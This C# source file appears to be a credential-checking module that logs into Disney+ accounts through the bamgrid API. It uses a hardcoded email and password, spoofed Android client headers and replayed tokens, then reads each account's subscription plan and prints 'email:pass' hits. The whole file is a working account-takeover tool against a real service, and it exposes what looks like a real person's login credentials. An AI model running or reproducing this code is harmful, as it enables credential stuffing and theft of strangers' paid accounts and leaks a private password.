using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Fox.Configs
{
    internal class Disney
    {
        public static void disney()
        {
            using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
            {
                string email = "richar06@live.com.mx";
                string pass = "Kof132406";
                req.IgnoreProtocolErrors = true;
                req.AddHeader("Host", "global.edge.bamgrid.com");
                req.AddHeader("accept", "application/json");
                req.AddHeader("authorization", "Bearer ZGlzbmV5JmFuZHJvaWQmMS4wLjA.bkeb0m230uUhv8qrAXuNu39tbE_mD5EEhM_NAcohjyA");
                req.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                req.AddHeader("x-bamsdk-platform", "android");
                req.AddHeader("x-bamsdk-version", "4.18.0");
                req.AddHeader("x-dss-edge-accept", "vnd.dss.edge+json; version=1");
                req.AddHeader("x-bamsdk-transaction-id", "ab3990a9-f2cf-40c7-be23-05071877dcb6");
                req.AddHeader("user-agent", "BAMSDK/v4.18.0 (disney-svod-3d9324fc 1.11.2.0; v2.0/v4.18.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)");
                req.AddHeader("accept-encoding", "gzip");
                string payload = "grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&subject_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI5MWViZDA0Ny1mMzFiLTQ0MWMtOTE2Ni1mYzE3MzcwM2VkY2QiLCJhdWQiOiJ1cm46YmFtdGVjaDpzZXJ2aWNlOnRva2VuIiwibmJmIjoxNjA2NTYxODA1LCJpc3MiOiJ1cm46YmFtdGVjaDpzZXJ2aWNlOmRldmljZSIsImV4cCI6MjQ3MDU2MTgwNSwiaWF0IjoxNjA2NTYxODA1LCJqdGkiOiJhMjQwZWRjZC05NjE1LTQzYzUtOTQxMS1lNjZhMjkwMzcxNmMifQ.388oU7X8XyjFa1haGqFiu_ifOfeE-21DOq0P9wwCsNasqpUb6mZeksvCLh0cnSMXvJeffsB8XaTKGCkiHM1mIg&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice&platform=android&latitude=52.368&longitude=-70.9036";
                string send_data = req.Post("https://global.edge.bamgrid.com/token", payload, "application/x-www-form-urlencoded").ToString();
                if (send_data.Contains("unauthorized_client") | send_data.Contains("invalid-token"))
                {
                    Console.WriteLine("retry");

                }
                else
                {
                    var access_token = Fox.Fuctions.Parsing.JSON(send_data, "access_token");
                    string access_tokena = String.Join(", ", access_token);
                    req.AddHeader("Host", "global.edge.bamgrid.com");
                    req.AddHeader("accept", "application/json; charset=utf-8");
                    req.AddHeader("authorization", "Bearer " + access_tokena);
                    req.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                    req.AddHeader("x-bamsdk-platform", "android");
                    req.AddHeader("x-bamsdk-version", "4.18.0");
                    req.AddHeader("x-dss-edge-accept", "vnd.dss.edge+json; version=1");
                    req.AddHeader("x-bamsdk-transaction-id", "7d76a5ab-56d7-4d11-af88-e5cd21435448");
                    req.AddHeader("user-agent", "BAMSDK/v4.18.0 (disney-svod-3d9324fc 1.11.2.0; v2.0/v4.18.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)");
                    req.AddHeader("accept-encoding", "gzip");
                    payload = "{\"email\":\"" + email+ "\",\"password\":\"" + pass + "\"}";
                    send_data = req.Post("https://global.edge.bamgrid.com/idp/login", payload, "application/json").ToString();
                    if (send_data.Contains("token_type") | send_data.Contains("id_token"))
                    {
                        var id = Fox.Fuctions.Parsing.JSON(send_data, "id_token");
                        string ida = String.Join(", ", id);
                        req.AddHeader("Host", "global.edge.bamgrid.com");
                        req.AddHeader("accept", "application/json; charset=utf-8");
                        req.AddHeader("authorization", "Bearer " + access_tokena);
                        req.AddHeader("x-bamsdk-client-id", "disney-svod-3d9324fc");
                        req.AddHeader("x-bamsdk-platform", "android");
                        req.AddHeader("x-bamsdk-version", "4.18.0");
                        req.AddHeader("x-dss-edge-accept", "vnd.dss.edge+json; version=1");
                        req.AddHeader("x-bamsdk-transaction-id", "7d76a5ab-56d7-4d11-af88-e5cd21435448");
                        req.AddHeader("user-agent", "BAMSDK/v4.18.0 (disney-svod-3d9324fc 1.11.2.0; v2.0/v4.18.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)");
                        req.AddHeader("accept-encoding", "gzip");
                        payload = "{\"id_token\":\"" + ida + "\"}";
                        send_data = req.Post("https://global.edge.bamgrid.com/accounts/grant", payload, "application/json").ToString();
                        var assegay = Fox.Fuctions.Parsing.JSON(send_data, "assertion");
                        string assegayy = String.Join(", ", assegay);
                        req.AddHeader("Accept", "application/json");
                        req.AddHeader("Authorization", "Bearer ZGlzbmV5JmFuZHJvaWQmMS4wLjA.bkeb0m230uUhv8qrAXuNu39tbE_mD5EEhM_NAcohjyA");
                        req.AddHeader("X-BAMSDK-Client-ID", "disney-svod-3d9324fc");
                        req.AddHeader("X-BAMSDK-Platform", "android");
                        req.AddHeader("X-BAMSDK-Version", "4.18.0");
                        req.AddHeader("X-DSS-Edge-Accept", "vnd.dss.edge+json; version=1");
                        req.AddHeader("X-BAMSDK-Transaction-ID", "3dddc9ca-3d05-49f3-ad21-7b9856b31170");
                        req.AddHeader("User-Agent", "BAMSDK/v4.18.0 (disney-svod-3d9324fc 1.11.2.0; v2.0/v4.18.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)");
                        req.AddHeader("Host", "global.edge.bamgrid.com");
                        req.AddHeader("Connection", "Keep-Alive");
                        req.AddHeader("Accept-Encoding", "gzip");
                        payload = "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token=" + assegayy + "&subject_token_type=urn:bamtech:params:oauth:token-type:account";
                        send_data = req.Post("https://global.edge.bamgrid.com/token", payload, "application/x-www-form-urlencoded").ToString();
                        var asertpo = Fox.Fuctions.Parsing.JSON(send_data, "access_token");
                        string asertpow = String.Join(", ", asertpo);
                        req.AddHeader("Accept", "application/json; charset=utf-8");
                        req.AddHeader("Authorization", "Bearer " + asertpow);
                        req.AddHeader("X-BAMSDK-Client-ID", "disney-svod-3d9324fc");
                        req.AddHeader("X-BAMSDK-Platform", "android");
                        req.AddHeader("X-BAMSDK-Version", "4.18.0");
                        req.AddHeader("X-DSS-Edge-Accept", "vnd.dss.edge+json; version=1");
                        req.AddHeader("X-BAMSDK-Transaction-ID", "58234fe0-1d6d-4e05-a6d6-a6838e3609a4");
                        req.UserAgent = "BAMSDK/v4.18.0 (disney-svod-3d9324fc 1.11.2.0; v2.0/v4.18.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)";
                        req.AddHeader("Host", "global.edge.bamgrid.com");
                        req.AddHeader("Connection", "Keep-Alive");
                        req.AddHeader("Accept-Encoding", "gzip");
                        send_data = req.Get("https://global.edge.bamgrid.com/accounts/me", null).ToString();

                        var emailVerified = Fox.Fuctions.Parsing.JSON(send_data, "emailVerified");
                        string emailVerifiedw = String.Join(", ", emailVerified);

                        var securityFlagged = Fox.Fuctions.Parsing.JSON(send_data, "securityFlagged");
                        string securityFlaggedw = String.Join(", ", securityFlagged);

                        var country = Fox.Fuctions.Parsing.JSON(send_data, "country");
                        string countryw = String.Join(", ", country);

                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "application/json");
                        req.AddHeader("X-BAMSDK-Client-ID", "disney-svod-3d9324fc");
                        req.AddHeader("Authorization", "Bearer " + asertpow);
                        req.AddHeader("X-BAMSDK-Platform", "android");
                        req.AddHeader("X-BAMSDK-Version", "4.18.0");
                        req.AddHeader("User-Agent", "BAMSDK/v4.18.0 (disney-svod-3d9324fc 1.11.2.0; v2.0/v4.18.0; android; phone) OnePlus A5010 (OnePlus-user 7.1.2 20171130.276299 release-keys; Linux; 7.1.2; API 25)");
                        req.AddHeader("Host", "global.edge.bamgrid.com");
                        req.AddHeader("Connection", "Keep-Alive");
                        req.AddHeader("Accept-Encoding", "gzip");
                        send_data = req.Get("https://global.edge.bamgrid.com/subscriptions", null).ToString();
                        var name = Fox.Fuctions.Parsing.JSON(send_data, "name");
                        string namew = String.Join(", ", name);

                        var EXPIRY = Fox.Fuctions.Parsing.LR(send_data, "\"nextRenewalDate\":\"", "T");
                        string EXPIRYw = String.Join(", ", EXPIRY);

                        if (securityFlagged.Contains("nextRenewalDate"))
                        {
                          

                            string capture = " / " + email + ":" + pass ;
                            Console.WriteLine (capture);
                           


                         


                        }
                        else 
                        {



               

                            string capture = " + " + email + ":" + pass + " | Plan = " + namew;
                            Console.WriteLine(capture);


                        }
                     
                       



                        

                      


                    }
                    else if (send_data.Contains("errors") | send_data.Contains("Bad credentials sent for disney"))
                    {
          

                        string capture = " - " + email + ":" + pass;
                        Console.WriteLine(capture);


                    }
                   





                }
       





            }

        }
    }
}
